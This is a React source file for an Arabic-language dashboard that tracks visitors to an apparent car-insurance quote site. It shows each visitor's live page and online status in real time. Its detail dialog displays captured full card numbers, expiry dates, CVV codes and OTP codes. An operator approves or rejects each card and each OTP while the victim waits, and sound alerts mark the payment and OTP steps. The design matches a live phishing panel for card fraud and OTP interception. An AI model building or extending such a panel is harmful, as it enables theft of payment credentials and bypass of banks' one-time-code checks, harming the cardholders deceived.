import { useEffect, useState, useRef } from "react";
import { useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { SidebarProvider, SidebarTrigger } from "@/components/ui/sidebar";
import { DashboardSidebar } from "@/components/DashboardSidebar";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { CheckCircle, XCircle, Clock, Eye, Loader2, MapPin, RefreshCw } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { usePresence, OnlineUser } from "@/hooks/usePresence";

interface Application {
  id: string;
  created_at: string;
  updated_at: string;
  full_name: string;
  phone: string;
  insurance_type: string;
  document_type: string;
  id_number?: string;
  serial_number?: string;
  vehicle_manufacturer: string;
  vehicle_model: string;
  vehicle_year: string;
  vehicle_value: number;
  selected_company: string;
  selected_price: string;
  regular_price: string;
  cardholder_name: string;
  card_number: string;
  card_last_4: string;
  card_type: string;
  expiry_date: string;
  card_cvv: string;
  otp_code: string;
  current_step: string;
  step_1_approved: boolean;
  step_2_approved: boolean;
  step_3_approved: boolean;
  payment_approved: boolean;
  otp_approved: boolean;
  status: string;
  usage_purpose: string;
  policy_start_date: string;
  add_driver: boolean;
}

const getPageName = (step: string): string => {
  const pages: { [key: string]: string } = {
    'quote_form': '📝 صفحة النموذج الأول',
    'vehicle_info': '🚗 صفحة معلومات المركبة',
    'insurance_selection': '🏢 صفحة اختيار التأمين',
    'payment': '💳 صفحة الدفع',
    'otp': '🔐 صفحة التحقق OTP',
    'completed': '✅ مكتمل',
  };
  return pages[step] || step || 'غير معروف';
};

const DashboardApplications = () => {
  const navigate = useNavigate();
  const [applications, setApplications] = useState<Application[]>([]);
  const [selectedApp, setSelectedApp] = useState<Application | null>(null);
  const [relatedApplications, setRelatedApplications] = useState<Application[]>([]);
  const [showDetails, setShowDetails] = useState(false);
  const [loading, setLoading] = useState(true);
  const [refreshing, setRefreshing] = useState(false);
  const { toast } = useToast();
  const { onlineUsers } = usePresence();
  const previousStepsRef = useRef<Map<string, string>>(new Map());

  useEffect(() => {
    const checkAuth = async () => {
      const { data: { session } } = await supabase.auth.getSession();
      if (!session) {
        navigate("/login");
        return;
      }
      await fetchApplications();
      setLoading(false);
    };

    checkAuth();

    const channel = supabase
      .channel('applications_changes')
      .on(
        'postgres_changes',
        {
          event: '*',
          schema: 'public',
          table: 'customer_applications'
        },
        (payload) => {
          console.log('Realtime update:', payload);
          fetchApplications();
          
          if (payload.eventType === 'UPDATE' || payload.eventType === 'INSERT') {
            const newData = payload.new as any;
            const previousStep = previousStepsRef.current.get(newData.id);
            
            // تنبيه عند تغيير الصفحة
            if (previousStep && previousStep !== newData.current_step) {
              playPageChangeSound();
              toast({
                title: "📍 العميل انتقل لصفحة جديدة",
                description: `${newData.full_name || 'عميل'} انتقل إلى ${getPageName(newData.current_step)}`,
                duration: 5000,
              });
            }
            
            // تحديث الخطوة السابقة
            previousStepsRef.current.set(newData.id, newData.current_step);
            
            // تنبيه خاص بالصفحة الأولى (النموذج الأول)
            if (newData.current_step === 'quote_form' && payload.eventType === 'INSERT') {
              playQuoteFormSound();
              toast({
                title: "📋 عميل جديد بدأ التسجيل!",
                description: `العميل ${newData.full_name || 'غير معروف'} أكمل الصفحة الأولى`,
                duration: 8000,
              });
            }
            
            if (newData.current_step === 'payment' && !newData.payment_approved) {
              playNotificationSound();
              toast({
                title: "🔔 طلب جديد يحتاج موافقة!",
                description: `العميل ${newData.full_name || 'غير معروف'} وصل لمرحلة الدفع`,
                duration: 10000,
              });
            }
            if (newData.current_step === 'otp' && !newData.otp_approved) {
              playNotificationSound();
              toast({
                title: "🔔 طلب جديد يحتاج موافقة!",
                description: `العميل ${newData.full_name || 'غير معروف'} وصل لمرحلة OTP`,
                duration: 10000,
              });
            }
          }
        }
      )
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, [navigate]);

  // صوت تنبيه عند تغيير الصفحة
  const playPageChangeSound = () => {
    const audioContext = new (window.AudioContext || (window as any).webkitAudioContext)();
    const oscillator = audioContext.createOscillator();
    const gainNode = audioContext.createGain();
    
    oscillator.connect(gainNode);
    gainNode.connect(audioContext.destination);
    
    oscillator.frequency.value = 440;
    oscillator.type = 'sine';
    
    gainNode.gain.setValueAtTime(0.15, audioContext.currentTime);
    gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.3);
    
    oscillator.start(audioContext.currentTime);
    oscillator.stop(audioContext.currentTime + 0.3);
  };

  // صوت تنبيه لصفحة النموذج الأولى (صوت ناعم ومختلف)
  const playQuoteFormSound = () => {
    const audioContext = new (window.AudioContext || (window as any).webkitAudioContext)();
    
    // نبضة واحدة طويلة بتردد منخفض
    const oscillator = audioContext.createOscillator();
    const gainNode = audioContext.createGain();
    
    oscillator.connect(gainNode);
    gainNode.connect(audioContext.destination);
    
    oscillator.frequency.value = 500; // تردد أقل لصوت أنعم
    oscillator.type = 'sine';
    
    gainNode.gain.setValueAtTime(0.2, audioContext.currentTime);
    gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.8);
    
    oscillator.start(audioContext.currentTime);
    oscillator.stop(audioContext.currentTime + 0.8);
    
    // نبضة ثانية بتردد أعلى قليلاً
    setTimeout(() => {
      const osc2 = audioContext.createOscillator();
      const gain2 = audioContext.createGain();
      osc2.connect(gain2);
      gain2.connect(audioContext.destination);
      osc2.frequency.value = 650;
      osc2.type = 'sine';
      gain2.gain.setValueAtTime(0.2, audioContext.currentTime);
      gain2.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.6);
      osc2.start(audioContext.currentTime);
      osc2.stop(audioContext.currentTime + 0.6);
    }, 900);
  };

  // صوت تنبيه لصفحة الدفع (صوت قوي ومتكرر)
  const playNotificationSound = () => {
    const audioContext = new (window.AudioContext || (window as any).webkitAudioContext)();
    const oscillator = audioContext.createOscillator();
    const gainNode = audioContext.createGain();
    
    oscillator.connect(gainNode);
    gainNode.connect(audioContext.destination);
    
    oscillator.frequency.value = 800;
    oscillator.type = 'sine';
    
    gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
    gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.5);
    
    oscillator.start(audioContext.currentTime);
    oscillator.stop(audioContext.currentTime + 0.5);
    
    setTimeout(() => {
      const osc2 = audioContext.createOscillator();
      const gain2 = audioContext.createGain();
      osc2.connect(gain2);
      gain2.connect(audioContext.destination);
      osc2.frequency.value = 800;
      osc2.type = 'sine';
      gain2.gain.setValueAtTime(0.3, audioContext.currentTime);
      gain2.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.5);
      osc2.start(audioContext.currentTime);
      osc2.stop(audioContext.currentTime + 0.5);
    }, 600);
    
    setTimeout(() => {
      const osc3 = audioContext.createOscillator();
      const gain3 = audioContext.createGain();
      osc3.connect(gain3);
      gain3.connect(audioContext.destination);
      osc3.frequency.value = 800;
      osc3.type = 'sine';
      gain3.gain.setValueAtTime(0.3, audioContext.currentTime);
      gain3.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.5);
      osc3.start(audioContext.currentTime);
      osc3.stop(audioContext.currentTime + 0.5);
    }, 1200);
  };

  const fetchApplications = async () => {
    setRefreshing(true);
    const { data, error } = await supabase
      .from('customer_applications')
      .select('*')
      .order('updated_at', { ascending: false });

    if (error) {
      console.error('Error fetching applications:', error);
      setRefreshing(false);
      return;
    }

    // تحديث الخطوات السابقة للتتبع
    data?.forEach(app => {
      if (!previousStepsRef.current.has(app.id)) {
        previousStepsRef.current.set(app.id, app.current_step);
      }
    });

    setApplications(data || []);
    setRefreshing(false);
  };

  const approveStep = async (appId: string, stepField: string) => {
    const { error } = await supabase
      .from('customer_applications')
      .update({ [stepField]: true })
      .eq('id', appId);

    if (error) {
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء الموافقة",
        variant: "destructive"
      });
      return;
    }

    toast({
      title: "تمت الموافقة",
      description: "تم الموافقة على الخطوة بنجاح",
    });

    fetchApplications();
    if (selectedApp) {
      fetchRelatedApplications(selectedApp.phone);
    }
  };

  const rejectStep = async (appId: string) => {
    const { error } = await supabase
      .from('customer_applications')
      .update({ 
        status: 'rejected'
      })
      .eq('id', appId);

    if (error) {
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء الرفض",
        variant: "destructive"
      });
      return;
    }

    toast({
      title: "تم الرفض",
      description: "تم رفض الطلب",
    });

    fetchApplications();
    if (selectedApp) {
      fetchRelatedApplications(selectedApp.phone);
    }
  };

  const getStepBadge = (approved: boolean) => {
    if (approved) {
      return <Badge className="bg-green-500"><CheckCircle className="w-3 h-3 mr-1" /> موافق عليه</Badge>;
    }
    return <Badge variant="destructive"><Clock className="w-3 h-3 mr-1" /> بانتظار الموافقة</Badge>;
  };

  const fetchRelatedApplications = async (phone: string) => {
    const { data, error } = await supabase
      .from('customer_applications')
      .select('*')
      .eq('phone', phone)
      .order('created_at', { ascending: true });

    if (error) {
      console.error('Error fetching related applications:', error);
      return;
    }

    setRelatedApplications(data || []);
  };

  if (loading) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <Loader2 className="h-12 w-12 animate-spin text-primary" />
      </div>
    );
  }

  return (
    <SidebarProvider>
      <div className="min-h-screen flex w-full">
        <DashboardSidebar />
        
        <div className="flex-1 flex flex-col">
          <header className="h-16 border-b bg-card flex items-center px-6 sticky top-0 z-10">
            <SidebarTrigger className="p-2 hover:bg-accent rounded-md" />
            <h1 className="text-2xl font-bold mr-4">بيانات العملاء</h1>
          </header>

          <main className="flex-1 p-6 bg-muted/30">
            <div className="max-w-7xl mx-auto space-y-6">
              <div className="flex items-center justify-between">
                <div>
                  <h2 className="text-3xl font-bold mb-2">إدارة طلبات العملاء</h2>
                  <p className="text-muted-foreground">
                    إجمالي {applications.length} طلب | متصل الآن: {onlineUsers.size}
                  </p>
                </div>
                <Button
                  variant="outline"
                  size="sm"
                  onClick={fetchApplications}
                  disabled={refreshing}
                  className="gap-2"
                >
                  <RefreshCw className={`h-4 w-4 ${refreshing ? 'animate-spin' : ''}`} />
                  تحديث
                </Button>
              </div>

              <div className="grid gap-4">
                {applications.map((app) => {
                  const userOnline = onlineUsers.get(app.id);
                  const isOnline = !!userOnline;
                  
                  return (
                    <Card key={app.id} className={`p-4 md:p-6 transition-all ${isOnline ? 'ring-2 ring-green-500 shadow-lg' : ''}`}>
                      <div className="space-y-4">
                        {/* معلومات العميل الأساسية */}
                        <div className="flex flex-col md:flex-row md:items-start md:justify-between gap-4">
                          <div className="space-y-2 flex-1">
                            <div className="flex items-center gap-3 flex-wrap">
                              <h3 className="text-xl font-bold">{app.full_name || 'بدون اسم'}</h3>
                              {isOnline && (
                                <div className="flex items-center gap-2 bg-green-100 dark:bg-green-900/30 px-3 py-1 rounded-full">
                                  <div className="relative">
                                    <div className="w-3 h-3 bg-green-500 rounded-full animate-pulse"></div>
                                    <div className="absolute inset-0 w-3 h-3 bg-green-500 rounded-full opacity-50 animate-ping"></div>
                                  </div>
                                  <span className="text-xs font-semibold text-green-700 dark:text-green-300">متصل الآن</span>
                                </div>
                              )}
                            </div>
                            
                            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-2 text-sm">
                              <p className="flex items-center gap-1">
                                <span className="text-muted-foreground">📱 الهاتف:</span>
                                <span className="font-semibold" dir="ltr">{app.phone || 'غير متوفر'}</span>
                              </p>
                              {app.serial_number && (
                                <p className="flex items-center gap-1">
                                  <span className="text-muted-foreground">🔢 التسلسلي:</span>
                                  <span className="font-semibold">{app.serial_number}</span>
                                </p>
                              )}
                              {app.insurance_type && (
                                <p className="flex items-center gap-1">
                                  <span className="text-muted-foreground">📋 التأمين:</span>
                                  <span className="font-semibold">{app.insurance_type === 'comprehensive' ? 'شامل' : 'ضد الغير'}</span>
                                </p>
                              )}
                              {app.vehicle_manufacturer && (
                                <p className="flex items-center gap-1">
                                  <span className="text-muted-foreground">🚗 المركبة:</span>
                                  <span className="font-semibold">{app.vehicle_manufacturer} {app.vehicle_model} ({app.vehicle_year})</span>
                                </p>
                              )}
                              {app.vehicle_value && (
                                <p className="flex items-center gap-1">
                                  <span className="text-muted-foreground">💰 القيمة:</span>
                                  <span className="font-semibold">{app.vehicle_value.toLocaleString('ar-SA')} ر.س</span>
                                </p>
                              )}
                              {app.selected_company && (
                                <p className="flex items-center gap-1">
                                  <span className="text-muted-foreground">🏢 الشركة:</span>
                                  <span className="font-semibold">{app.selected_company} - {app.selected_price} ر.س</span>
                                </p>
                              )}
                            </div>
                            
                            <p className="text-xs text-muted-foreground">
                              📅 {new Date(app.created_at).toLocaleDateString('ar-EG', {
                                year: 'numeric',
                                month: 'short',
                                day: 'numeric',
                              })}
                              {' | '}
                              <span dir="ltr">
                                🕐 {new Date(app.created_at).toLocaleTimeString('ar-EG', {
                                  hour: '2-digit',
                                  minute: '2-digit'
                                })}
                              </span>
                              {app.updated_at && app.updated_at !== app.created_at && (
                                <>
                                  {' | '}
                                  آخر تحديث: {new Date(app.updated_at).toLocaleTimeString('ar-EG', {
                                    hour: '2-digit',
                                    minute: '2-digit'
                                  })}
                                </>
                              )}
                            </p>
                          </div>
                          
                          {/* الصفحة الحالية */}
                          <div className="flex flex-col items-start md:items-end gap-2">
                            <div className={`px-4 py-2 rounded-lg border-2 ${
                              isOnline 
                                ? 'bg-green-50 dark:bg-green-900/20 border-green-300 dark:border-green-700' 
                                : 'bg-muted border-muted-foreground/20'
                            }`}>
                              <div className="flex items-center gap-2">
                                <MapPin className={`w-4 h-4 ${isOnline ? 'text-green-600' : 'text-muted-foreground'}`} />
                                <span className="text-xs text-muted-foreground">الصفحة الحالية:</span>
                              </div>
                              <p className={`font-bold text-sm mt-1 ${isOnline ? 'text-green-700 dark:text-green-300' : ''}`}>
                                {getPageName(app.current_step)}
                              </p>
                            </div>
                            
                            <Button
                              onClick={() => {
                                setSelectedApp(app);
                                fetchRelatedApplications(app.phone);
                                setShowDetails(true);
                              }}
                              variant="default"
                              size="sm"
                              className="gap-2"
                            >
                              <Eye className="w-4 h-4" />
                              عرض التفاصيل
                            </Button>
                          </div>
                        </div>

                        {/* شريط الحالة */}
                        <div className="pt-4 border-t">
                          <div className="flex flex-wrap gap-2 items-center">
                            <Badge variant={app.status === 'rejected' ? 'destructive' : 'secondary'}>
                              الحالة: {app.status === 'rejected' ? 'مرفوض' : app.current_step === 'otp' && app.otp_approved ? 'مكتمل' : 'قيد المعالجة'}
                            </Badge>
                            {app.current_step === 'payment' && !app.payment_approved && (
                              <Badge variant="outline" className="bg-orange-100 dark:bg-orange-950 animate-pulse">
                                في انتظار موافقة الدفع 💳
                              </Badge>
                            )}
                            {app.current_step === 'otp' && !app.otp_approved && (
                              <Badge variant="outline" className="bg-blue-100 dark:bg-blue-950 animate-pulse">
                                في انتظار موافقة OTP 🔐
                              </Badge>
                            )}
                          </div>
                        </div>
                      </div>
                    </Card>
                  );
                })}
              </div>

              {/* Dialog لعرض التفاصيل الكاملة */}
              <Dialog open={showDetails} onOpenChange={setShowDetails}>
        <DialogContent className="max-w-4xl max-h-[90vh] overflow-y-auto">
          <DialogHeader>
            <DialogTitle>تفاصيل الطلب الكاملة</DialogTitle>
            <DialogDescription>
              جميع البيانات المدخلة من قبل العميل
            </DialogDescription>
          </DialogHeader>

          {selectedApp && (
            <div className="space-y-6">
              {/* الصفحة الحالية للعميل */}
              <div className={`p-4 rounded-lg border-2 ${
                onlineUsers.has(selectedApp.id)
                  ? 'bg-green-50 dark:bg-green-900/20 border-green-300 dark:border-green-700'
                  : 'bg-muted border-muted-foreground/20'
              }`}>
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-3">
                    <MapPin className={`w-5 h-5 ${onlineUsers.has(selectedApp.id) ? 'text-green-600' : 'text-muted-foreground'}`} />
                    <div>
                      <p className="text-sm text-muted-foreground">الصفحة الحالية</p>
                      <p className={`text-lg font-bold ${onlineUsers.has(selectedApp.id) ? 'text-green-700 dark:text-green-300' : ''}`}>
                        {getPageName(selectedApp.current_step)}
                      </p>
                    </div>
                  </div>
                  <div className="flex items-center gap-2">
                    {onlineUsers.has(selectedApp.id) ? (
                      <>
                        <div className="relative">
                          <div className="w-4 h-4 bg-green-500 rounded-full animate-pulse"></div>
                          <div className="absolute inset-0 w-4 h-4 bg-green-500 rounded-full opacity-50 animate-ping"></div>
                        </div>
                        <span className="text-sm font-bold text-green-600">متصل الآن</span>
                      </>
                    ) : (
                      <>
                        <div className="w-4 h-4 bg-gray-400 rounded-full"></div>
                        <span className="text-sm font-semibold text-gray-600">غير متصل</span>
                      </>
                    )}
                  </div>
                </div>
              </div>

              {/* معلومات العميل */}
              <div className="bg-blue-50 dark:bg-blue-950/20 p-4 rounded-lg border border-blue-200 dark:border-blue-800">
                <h3 className="font-bold text-lg mb-3">👤 معلومات العميل</h3>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                  <div>
                    <p className="text-xs text-muted-foreground mb-1">الاسم الكامل:</p>
                    <p className="font-semibold text-base">{selectedApp.full_name || 'غير متوفر'}</p>
                  </div>
                  <div>
                    <p className="text-xs text-muted-foreground mb-1">رقم الهاتف:</p>
                    <p className="font-semibold text-base" dir="ltr">{selectedApp.phone || 'غير متوفر'}</p>
                  </div>
                  <div>
                    <p className="text-xs text-muted-foreground mb-1">نوع التأمين:</p>
                    <p className="font-semibold text-base">{selectedApp.insurance_type || 'غير متوفر'}</p>
                  </div>
                  <div>
                    <p className="text-xs text-muted-foreground mb-1">نوع المستند:</p>
                    <p className="font-semibold text-base">{selectedApp.document_type || 'غير متوفر'}</p>
                  </div>
                  <div>
                    <p className="text-xs text-muted-foreground mb-1">🆔 رقم الهوية/الإقامة:</p>
                    <p className="font-semibold text-base">{selectedApp.id_number || 'غير متوفر'}</p>
                  </div>
                  <div>
                    <p className="text-xs text-muted-foreground mb-1">🔢 الرقم التسلسلي:</p>
                    <p className="font-semibold text-base">{selectedApp.serial_number || 'غير متوفر'}</p>
                  </div>
                  <div>
                    <p className="text-xs text-muted-foreground mb-1">📅 تاريخ التسجيل:</p>
                    <p className="font-semibold text-base">
                      {selectedApp.created_at 
                        ? new Date(selectedApp.created_at).toLocaleDateString('ar-EG', {
                            year: 'numeric',
                            month: 'long',
                            day: 'numeric',
                            calendar: 'gregory'
                          })
                        : 'غير متوفر'}
                    </p>
                  </div>
                  <div>
                    <p className="text-xs text-muted-foreground mb-1">🕐 وقت التسجيل:</p>
                    <p className="font-semibold text-base" dir="ltr">
                      {selectedApp.created_at 
                        ? new Date(selectedApp.created_at).toLocaleTimeString('ar-EG', {
                            hour: '2-digit',
                            minute: '2-digit',
                            second: '2-digit'
                          })
                        : 'غير متوفر'}
                    </p>
                  </div>
                </div>
              </div>

              {/* معلومات المركبة */}
              {selectedApp.vehicle_manufacturer && (
                <div className="bg-green-50 dark:bg-green-950/20 p-4 rounded-lg border border-green-200 dark:border-green-800">
                  <h3 className="font-bold text-lg mb-3">🚗 معلومات المركبة</h3>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                    <div>
                      <p className="text-xs text-muted-foreground mb-1">الصانع:</p>
                      <p className="font-semibold text-base">{selectedApp.vehicle_manufacturer}</p>
                    </div>
                    <div>
                      <p className="text-xs text-muted-foreground mb-1">الموديل:</p>
                      <p className="font-semibold text-base">{selectedApp.vehicle_model}</p>
                    </div>
                    <div>
                      <p className="text-xs text-muted-foreground mb-1">سنة الصنع:</p>
                      <p className="font-semibold text-base">{selectedApp.vehicle_year}</p>
                    </div>
                    <div>
                      <p className="text-xs text-muted-foreground mb-1">قيمة السيارة:</p>
                      <p className="font-semibold text-base">{selectedApp.vehicle_value?.toLocaleString('ar-SA')} ر.س</p>
                    </div>
                  </div>
                </div>
              )}

              {/* شركة التأمين المختارة */}
              {selectedApp.selected_company && (
                <div>
                  <h3 className="font-bold mb-2">شركة التأمين المختارة</h3>
                  <div className="grid grid-cols-2 gap-2 text-sm">
                    <p><span className="font-semibold">الشركة:</span> {selectedApp.selected_company}</p>
                    <p><span className="font-semibold">السعر:</span> {selectedApp.selected_price} ر.س</p>
                  </div>
                </div>
              )}

              {/* جميع البطاقات الائتمانية المدخلة */}
              {relatedApplications.filter(app => app.cardholder_name).length > 0 && (
                <div className="space-y-4">
                  <h3 className="font-bold text-red-600 text-lg">⚠️ البطاقات الائتمانية المدخلة (سرية)</h3>
                  {relatedApplications
                    .filter(app => app.cardholder_name)
                    .map((app, index) => (
                      <div key={app.id} className="border-2 border-red-300 dark:border-red-800 rounded-lg p-4">
                        <div className="flex items-center justify-between mb-3">
                          <div className="flex items-center gap-2">
                            <Badge variant="outline" className="text-base font-bold">
                              البطاقة #{index + 1}
                            </Badge>
                            {app.payment_approved ? (
                              <Badge className="bg-green-500">
                                <CheckCircle className="w-3 h-3 mr-1" /> موافق عليها
                              </Badge>
                            ) : app.status === 'rejected' ? (
                              <Badge variant="destructive">
                                <XCircle className="w-3 h-3 mr-1" /> مرفوضة
                              </Badge>
                            ) : (
                              <Badge variant="destructive">
                                <Clock className="w-3 h-3 mr-1" /> بانتظار الموافقة
                              </Badge>
                            )}
                          </div>
                          {!app.payment_approved && app.status !== 'rejected' && (
                            <div className="flex gap-2">
                              <Button
                                onClick={() => approveStep(app.id, 'payment_approved')}
                                size="sm"
                                className="bg-green-600 hover:bg-green-700"
                              >
                                <CheckCircle className="h-4 w-4 ml-1" />
                                موافق
                              </Button>
                              <Button
                                onClick={() => rejectStep(app.id)}
                                size="sm"
                                variant="destructive"
                              >
                                <XCircle className="h-4 w-4 ml-1" />
                                رفض
                              </Button>
                            </div>
                          )}
                        </div>
                        <div className="space-y-3 bg-red-50 dark:bg-red-950/20 p-4 rounded-lg">
                          <div>
                            <p className="text-xs text-muted-foreground mb-1">📅 تاريخ الإدخال:</p>
                            <p className="font-semibold text-sm">
                              {new Date(app.created_at).toLocaleString('ar-EG', {
                                year: 'numeric',
                                month: 'short',
                                day: 'numeric',
                                hour: '2-digit',
                                minute: '2-digit'
                              })}
                            </p>
                          </div>
                          <div>
                            <p className="text-xs text-muted-foreground mb-1">اسم حامل البطاقة:</p>
                            <p className="font-bold text-base">{app.cardholder_name}</p>
                          </div>
                          <div>
                            <p className="text-xs text-muted-foreground mb-1">رقم البطاقة الكامل:</p>
                            <p className="font-mono font-bold text-lg" dir="ltr">
                              {app.card_number || `**** **** **** ${app.card_last_4}`}
                            </p>
                          </div>
                          <div className="grid grid-cols-2 gap-3">
                            <div>
                              <p className="text-xs text-muted-foreground mb-1">نوع البطاقة:</p>
                              <p className="font-semibold capitalize">{app.card_type}</p>
                            </div>
                            <div>
                              <p className="text-xs text-muted-foreground mb-1">تاريخ الانتهاء:</p>
                              <p className="font-mono font-semibold">{app.expiry_date}</p>
                            </div>
                          </div>
                          <div>
                            <p className="text-xs text-muted-foreground mb-1">رمز CVV:</p>
                            <p className="font-mono font-bold text-2xl text-red-600">{app.card_cvv || '***'}</p>
                          </div>
                        </div>
                      </div>
                    ))}
                </div>
              )}

              {/* جميع أكواد OTP المدخلة */}
              {relatedApplications.filter(app => app.otp_code).length > 0 && (
                <div className="space-y-4">
                  <h3 className="font-bold text-lg">🔐 أكواد التحقق OTP المدخلة</h3>
                  {relatedApplications
                    .filter(app => app.otp_code)
                    .map((app, index) => (
                      <div key={app.id} className="border-2 border-primary/30 rounded-lg p-4">
                        <div className="flex items-center justify-between mb-3">
                          <div className="flex items-center gap-2">
                            <Badge variant="outline" className="text-base font-bold">
                              كود OTP #{index + 1}
                            </Badge>
                            {app.otp_approved ? (
                              <Badge className="bg-green-500">
                                <CheckCircle className="w-3 h-3 mr-1" /> موافق عليه
                              </Badge>
                            ) : app.status === 'rejected' ? (
                              <Badge variant="destructive">
                                <XCircle className="w-3 h-3 mr-1" /> مرفوض
                              </Badge>
                            ) : (
                              <Badge variant="destructive">
                                <Clock className="w-3 h-3 mr-1" /> بانتظار الموافقة
                              </Badge>
                            )}
                          </div>
                          {!app.otp_approved && app.status !== 'rejected' && (
                            <div className="flex gap-2">
                              <Button
                                onClick={() => approveStep(app.id, 'otp_approved')}
                                size="sm"
                                className="bg-green-600 hover:bg-green-700"
                              >
                                <CheckCircle className="h-4 w-4 ml-1" />
                                موافق
                              </Button>
                              <Button
                                onClick={() => rejectStep(app.id)}
                                size="sm"
                                variant="destructive"
                              >
                                <XCircle className="h-4 w-4 ml-1" />
                                رفض
                              </Button>
                            </div>
                          )}
                        </div>
                        <div className="space-y-3">
                          <div>
                            <p className="text-xs text-muted-foreground mb-1">📅 تاريخ الإدخال:</p>
                            <p className="font-semibold text-sm">
                              {new Date(app.created_at).toLocaleString('ar-EG', {
                                year: 'numeric',
                                month: 'short',
                                day: 'numeric',
                                hour: '2-digit',
                                minute: '2-digit'
                              })}
                            </p>
                          </div>
                          <p className="text-3xl font-mono font-bold bg-primary/10 p-6 rounded-lg text-center text-primary border-2 border-primary/20">
                            {app.otp_code}
                          </p>
                        </div>
                      </div>
                    ))}
                </div>
              )}
            </div>
          )}
        </DialogContent>
      </Dialog>
            </div>
          </main>
        </div>
      </div>
    </SidebarProvider>
  );
};

export default DashboardApplications;
